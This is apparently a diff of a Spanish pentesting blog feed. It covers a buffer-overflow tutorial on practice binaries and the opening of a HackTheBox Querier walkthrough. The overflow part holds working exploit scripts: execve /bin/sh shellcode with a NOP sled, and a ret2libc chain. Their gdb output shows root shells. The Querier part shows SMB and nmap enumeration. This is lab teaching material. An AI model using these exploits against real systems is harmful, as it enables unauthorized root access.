+0008| 0xffffd248 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+0012| 0xffffd24c <span class="o">(</span><span class="s2">"7bUV"</span><span class="o">)</span>
+0016| 0xffffd250 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+0020| 0xffffd254 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+0024| 0xffffd258 <span class="nt">--</span><span class="o">&gt;</span> 0x13
+0028| 0xffffd25c <span class="nt">--</span><span class="o">&gt;</span> 0x0
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Como pudimos ver <code class="language-plaintext highlighter-rouge">EIP</code> contiene <code class="language-plaintext highlighter-rouge">BBBB</code> que era lo que definimos que haga en el script.</p>
+  </li>
+  <li>
+    <p>Vamos a buscar en la pila alguna dirección que contenga los <code class="language-plaintext highlighter-rouge">nops</code> que están antes del <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/pila.png" />
+</p>
+
+<ul>
+  <li>El comando funciona para inspeccionar la memoria vamos a examinar 300 unidades <code class="language-plaintext highlighter-rouge">w</code> quiere decir que cada unidad que se examina es una palabra y <code class="language-plaintext highlighter-rouge">x</code> indica que el formato de salida debe ser <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</li>
+</ul>
+
+<blockquote>
+  <p>$esp es el registro del stack pointer en arquitecturas x86. Este registro apunta a la cima de la pila en la memoria. En el contexto de un programa que ejecuta un exploit de desbordamiento de buffer, $esp te dirá dónde está actualmente la “cima” de la pila, lo cual es crítico para entender cómo tus datos (o payload) están organizados en la memoria.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/300wx <span class="nv">$esp</span>
+0xffffd240:	0xffffd400	0x00000000	0x00000000	0x56556237
+0xffffd250:	0x00000000	0x00000000	0x00000013	0x00000000
+0xffffd260:	0xf7c216ac	0xf7fd9e61	0xf7c1c9a2	0xffffd290
+0xffffd270:	0xf7e1dff4	0x56556280	0x00000000	0xf7c237c5
+0xffffd280:	0x00000001	0x00000000	0x00000078	0xf7c237c5
+0xffffd290:	0x00000002	0xffffd344	0xffffd350	0xffffd2b0
+0xffffd2a0:	0xf7e1dff4	0x56556212	0x00000002	0xffffd344
+0xffffd2b0:	0xf7e1dff4	0x56556280	0xf7ffcba0	0x00000000
+0xffffd2c0:	0x8a0cc8d7	0xf1c6e2c7	0x00000000	0x00000000
+0xffffd2d0:	0x00000000	0xf7ffcba0	0x00000000	0xd1348400
+0xffffd2e0:	0xf7ffda30	0xf7c23756	0xf7e1dff4	0xf7c23888
+0xffffd2f0:	0xf7fcaac4	0x56559000	0x00000002	0x56556090
+0xffffd300:	0x00000000	0xf7fdbe80	0xf7c23809	0x56559000
+0xffffd310:	0x00000002	0x56556090	0x00000000	0x565560c1
+0xffffd320:	0x56556212	0x00000002	0xffffd344	0x56556280
+0xffffd330:	0x565562e0	0xf7fceca0	0xffffd33c	0xf7ffda30
+0xffffd340:	0x00000002	0xffffd4bc	0xffffd4e9	0x00000000
+0xffffd350:	0xffffd5fa	0xffffd60e	0xffffd619	0xffffd626
+0xffffd360:	0xffffd684	0xffffd693	0xffffd6b7	0xffffd6ce
+0xffffd370:	0xffffdde7	0xffffddfb	0xffffde08	0xffffde12
+0xffffd380:	0xffffde1d	0xffffde30	0xffffde49	0xffffde58
+0xffffd390:	0xffffde63	0xffffde6e	0xffffde91	0xffffdeac
+0xffffd3a0:	0xffffdeca	0xffffdee8	0xffffdef0	0xffffdf16
+0xffffd3b0:	0xffffdf3f	0xffffdf54	0xffffdf5f	0xffffdf67
+0xffffd3c0:	0xffffdf87	0xffffdfb6	0xffffdfbf	0x00000000
+0xffffd3d0:	0x00000020	0xf7fc8570	0x00000021	0xf7fc8000
+0xffffd3e0:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
+0xffffd3f0:	0x00000006	0x00001000	0x00000011	0x00000064
+0xffffd400:	0x00000003	0x56555034	0x00000004	0x00000020
+0xffffd410:	0x00000005	0x0000000b	0x00000007	0xf7fca000
+0xffffd420:	0x00000008	0x00000000	0x00000009	0x56556090
+0xffffd430:	0x0000000b	0x00000000	0x0000000c	0x00000000
+0xffffd440:	0x0000000d	0x00000000	0x0000000e	0x00000000
+0xffffd450:	0x00000017	0x00000000	0x00000019	0xffffd49b
+0xffffd460:	0x0000001a	0x00000002	0x0000001f	0xffffdfcb
+0xffffd470:	0x0000000f	0xffffd4ab	0x0000001b	0x0000001c
+0xffffd480:	0x0000001c	0x00000020	0x00000000	0x00000000
+0xffffd490:	0x00000000	0x00000000	0x29000000	0xf4d13484
+0xffffd4a0:	0xe3943ad4	0xa212ba18	0x6939ccce	0x00363836
+0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
+0xffffd4c0:	0x696d2f65	0x6c657567	0x6174532f	0x764f6b63
+0xffffd4d0:	0x6c667265	0x6c2f776f	0x6c657665	0x656c2f73
+0xffffd4e0:	0x546c6576	0x65657268	0x90909000	0x90909090
+0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd5e0:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
+0xffffd5f0:	0xcdc931e3	0x42424280	0x4f430042	0x54524f4c
+0xffffd600:	0x3d4d5245	0x65757274	0x6f6c6f63	0x49440072
+0xffffd610:	0x414c5053	0x303a3d59	0x4e414c00	0x2e433d47
+0xffffd620:	0x2d465455	0x41500038	0x2f3d4854	0x2f727375
+0xffffd630:	0x61636f6c	0x62732f6c	0x2f3a6e69	0x2f727375
+0xffffd640:	0x61636f6c	0x69622f6c	0x752f3a6e	0x732f7273
+0xffffd650:	0x3a6e6962	0x7273752f	0x6e69622f	0x62732f3a
+0xffffd660:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x636f6c2f
+0xffffd670:	0x672f6c61	0x73656d61	0x73752f3a	0x61672f72
+0xffffd680:	0x0073656d	0x4d524554	0x616c613d	0x74697263
+0xffffd690:	0x58007974	0x48545541	0x5449524f	0x682f3d59
+0xffffd6a0:	0x2f656d6f	0x7567696d	0x2e2f6c65	0x74756158
+0xffffd6b0:	0x69726f68	0x58007974	0x435f4744	0x45525255
+0xffffd6c0:	0x445f544e	0x544b5345	0x693d504f	0x534c0033
+0xffffd6d0:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
+0xffffd6e0:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno vamos a tomar una dirección que contengo solo <code class="language-plaintext highlighter-rouge">nops</code> que es la esta mas repetida en este caso seria esta que yo elegí <code class="language-plaintext highlighter-rouge">0xffffd520:0x90909090</code>.</p>
+  </li>
+  <li>
+    <p><strong>Junk</strong> contiene una secuencia de caracteres <code class="language-plaintext highlighter-rouge">\x90</code> que, en hexadecimal, equivale a <code class="language-plaintext highlighter-rouge">0x90</code>, que es una sola instrucción <code class="language-plaintext highlighter-rouge">NOP</code>.</p>
+  </li>
+  <li>
+    <p>De igual forma estamos en <code class="language-plaintext highlighter-rouge">little endian</code> así que vamos a darle la vuelta.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffd530    | <span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>d5<span class="se">\x</span>30     | <span class="se">\x</span>30<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo que vamos a hacer es cambiar los 4 B que habías puesto por la dirección en los <code class="language-plaintext highlighter-rouge">nops</code> esto para que los <code class="language-plaintext highlighter-rouge">nops</code> se desplacen en la pila asta llegar al <code class="language-plaintext highlighter-rouge">shellcode</code> y se ejecute.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>otro.py
+<span class="c">#!/usr/bin/python2</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+offset <span class="o">=</span> 268  <span class="c"># En el shellcode son las instrucciones maliciosas</span>
+
+shellcode  <span class="o">=</span> b<span class="s2">""</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+<span class="c"># x90 representa la instrucción "NOP" en lenguaje de máquina</span>
+junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>
+
+<span class="c"># Usamos la dirección deseada en little endian</span>
+eip <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff"</span>
+
+<span class="c"># Salida del payload completo</span>
+print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo ejecutamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelThree <span class="si">$(</span>python2 otro.py<span class="si">)</span>
+Buf: j
+      XRh//shh/bin��0�
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>
+
+<h2 id="ret2libc">Ret2libc</h2>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Ret2libc</code>, abreviatura de “<code class="language-plaintext highlighter-rouge">return-to-libc</code>”, es una técnica clásica de explotación utilizada para eludir medidas de seguridad que previenen la ejecución de código inyectado, como las protecciones contra ejecución en la pila (<code class="language-plaintext highlighter-rouge">stack</code>). Esta técnica implica manipular la pila de llamadas de un programa vulnerable para hacer que ejecute funciones ya presentes en la biblioteca <code class="language-plaintext highlighter-rouge">libc</code>, como <code class="language-plaintext highlighter-rouge">system()</code>, que puede ejecutar comandos de <code class="language-plaintext highlighter-rouge">shell</code>.</p>
+  </li>
+  <li>
+    <p>Vamos analizar el código.</p>
+  </li>
+  <li>
+    <p>Esta es la función main.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/ret.png" />
+</p>
+
+<ul>
+  <li>Esta es la función <code class="language-plaintext highlighter-rouge">overflow</code> y vemos que le esta dando 20 bytes de tamaño al buffer.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/ret1.png" />
+</p>
+
+<ul>
+  <li>
+    <p>El problema de ahora es que no podemos correr el <code class="language-plaintext highlighter-rouge">shellcode</code> de antes por que mide mas del buffer asignado.</p>
+  </li>
+  <li>
+    <p>Comenzamos enviado 50 bytes.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelFour
+Reading symbols from levelFour...
+<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelFour<span class="o">)</span>
+gdb-peda<span class="nv">$ </span>pattern_arg 50
+Set 1 arguments to program
+gdb-peda<span class="nv">$ </span>run
+Starting program: /home/miguel/StackOverflow/levels/levelFour <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
+Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbA
+
+Program received signal SIGSEGV, Segmentation fault.
+Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
+
+Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
+EBX: 0x41412d41 <span class="o">(</span><span class="s1">'A-AA'</span><span class="o">)</span>
+ECX: 0xffffcf4c <span class="nt">--</span><span class="o">&gt;</span> 0x48d58600
+EDX: 0x1
+ESI: 0xffffd010 <span class="nt">--</span><span class="o">&gt;</span> 0x2
+EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+EBP: 0x44414128 <span class="o">(</span><span class="s1">'(AAD'</span><span class="o">)</span>
+ESP: 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
+EIP: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x413b4141
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
+0004| 0xffffcfc4 <span class="o">(</span><span class="s2">"EAAaAA0AAFAAbA"</span><span class="o">)</span>
+0008| 0xffffcfc8 <span class="o">(</span><span class="s2">"AA0AAFAAbA"</span><span class="o">)</span>
+0012| 0xffffcfcc <span class="o">(</span><span class="s2">"AFAAbA"</span><span class="o">)</span>
+0016| 0xffffcfd0 <span class="nt">--</span><span class="o">&gt;</span> 0x4162 <span class="o">(</span><span class="s1">'bA'</span><span class="o">)</span>
+0020| 0xffffcfd4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+0024| 0xffffcfd8 <span class="nt">--</span><span class="o">&gt;</span> 0x13
+0028| 0xffffcfdc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x413b4141 <span class="k">in</span> ?? <span class="o">()</span>
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">offset</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x413b4141
+1094402369 found at offset: 28
+</code></pre></div></div>
+
+<ul>
+  <li>En este tipo de explotaciones tenemos que saber la dirección de la función <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exit</code> ya que son funciones de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c4c870 &lt;system&gt;
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora la dirección de <code class="language-plaintext highlighter-rouge">exit</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
+<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c3c130 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a ver la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find /bin/sh
+Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
+Found 1 results, display max 1 items:
+libc.so.6 : 0xf7db5fc8 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Estamos en <code class="language-plaintext highlighter-rouge">little endian</code> entonces tenemos que darle la vuelta a todas las direcciones.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7c4c870    |   <span class="se">\x</span>f7<span class="se">\x</span>c4<span class="se">\x</span>c8<span class="se">\x</span>70
+0xf7c3c130    |   <span class="se">\x</span>f7<span class="se">\x</span>c3<span class="se">\x</span>c1<span class="se">\x</span>30
+0xf7db5fc8    |   <span class="se">\x</span>f7<span class="se">\x</span>db<span class="se">\x</span>5f<span class="se">\x</span>c8
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora definimos el script.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>levelFour.py
+<span class="c">#!/usr/bin/python2</span>
+
+offset <span class="o">=</span> 28
+
+junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset
+
+addr_system <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7"</span>
+addr_exit <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f7"</span>
+addr_bin_sh <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7"</span> <span class="c"># aqui es donde llamamos a /bin/bash para que nos de una shell</span>
+
+print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Lo ejecutamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelFour <span class="si">$(</span>python2 levelFour.py<span class="si">)</span>
+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="vulnhub/machines" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Scrambled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" rel="alternate" type="text/html" title="HackTheBox - Scrambled (medium)" /><published>2024-04-30T00:00:00-06:00</published><updated>2024-04-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png" />
 </p>
 
@@ -9471,723 +10204,5 @@ Warning: Remote path completions is disabled due to ruby limitation: quoting_det
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
 Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Querier (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html" rel="alternate" type="text/html" title="HackTheBox - Querier (medium)" /><published>2024-04-09T00:00:00-06:00</published><updated>2024-04-09T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/9fe0cda48876d1e8772de183c9546f78.png" />
-</p>
-
-<p>En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Excel en la cual mediante marcos encontraremos una función que contiene credenciales para conectarnos al servicio MSSQL que esta corriendo en la maquina ya dentro abusaremos del xp_dirtree para hacer una petición a nuestro recurso compartido y capturar el has ntlmv2 de un usuario que vamos a crackear para conectarnos de nuevo al servicio MSSQL y abusar del xp_cmdshell y obtener una reverse shell para la escalada de privilegios vamos a usar el gpp-decrypt para obtener la contraseña en texto plano que es del administrador y como extra explotaremos el SeImpersonatePrivilege.</p>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos con el escaneo de los puertos abiertos por el protocolo <strong>TCP</strong> y también escaneamos sus servicios que corren en los puertos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.67.247 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-05 12:44 CST
-Nmap scan report <span class="k">for </span>10.129.67.247
-Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT      STATE SERVICE       VERSION
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
-| ms-sql-ntlm-info:
-|   10.129.67.247:1433:
-|     Target_Name: HTB
-|     NetBIOS_Domain_Name: HTB
-|     NetBIOS_Computer_Name: QUERIER
-|     DNS_Domain_Name: HTB.LOCAL
-|     DNS_Computer_Name: QUERIER.HTB.LOCAL
-|     DNS_Tree_Name: HTB.LOCAL
-|_    Product_Version: 10.0.17763
-| ms-sql-info:
-|   10.129.67.247:1433:
-|     Version:
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: <span class="nb">false</span>
-|_    TCP port: 1433
-| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
-| Not valid before: 2024-04-05T18:40:54
-|_Not valid after:  2054-04-05T18:40:54
-|_ssl-date: 2024-04-05T18:45:35+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49668/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  msrpc         Microsoft Windows RPC
-49670/tcp open  msrpc         Microsoft Windows RPC
-49671/tcp open  msrpc         Microsoft Windows RPC
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode:
-|   3:1:1:
-|_    Message signing enabled but not required
-| smb2-time:
-|   <span class="nb">date</span>: 2024-04-05T18:45:27
-|_  start_date: N/A
-|_clock-skew: mean: <span class="nt">-1s</span>, deviation: 0s, median: <span class="nt">-1s</span>
-</code></pre></div></div>
-
-<h2 id="enumeración">Enumeración</h2>
-
-<ul>
-  <li>Vemos propiedades de la maquina y el dominio al cual pertenece que es <code class="language-plaintext highlighter-rouge">HTB.LOCAL</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.67.247
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Si listamos recursos compartidos por <strong>SMB</strong> vemos que no obtenemos nada.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.67.247 <span class="nt">--shares</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
-➜  nmap crackmapexec smb 10.129.67.247 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
-</code></pre></div></div>
-
-<ul>
-  <li>Sin embargo si lo hacemos con la herramienta <code class="language-plaintext highlighter-rouge">smbclient</code> vemos que si nos muestra los típicos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> 10.129.67.247 <span class="nt">-N</span>
-
-	Sharename       Type      Comment
-	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
-	C<span class="nv">$ </span>             Disk      Default share
-	IPC<span class="nv">$ </span>           IPC       Remote IPC
-	Reports         Disk
-Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
-do_connect: Connection to 10.129.67.247 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
-Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a cuales si tenemos capacidad de lectura o escritura.</li>
-</ul>
-
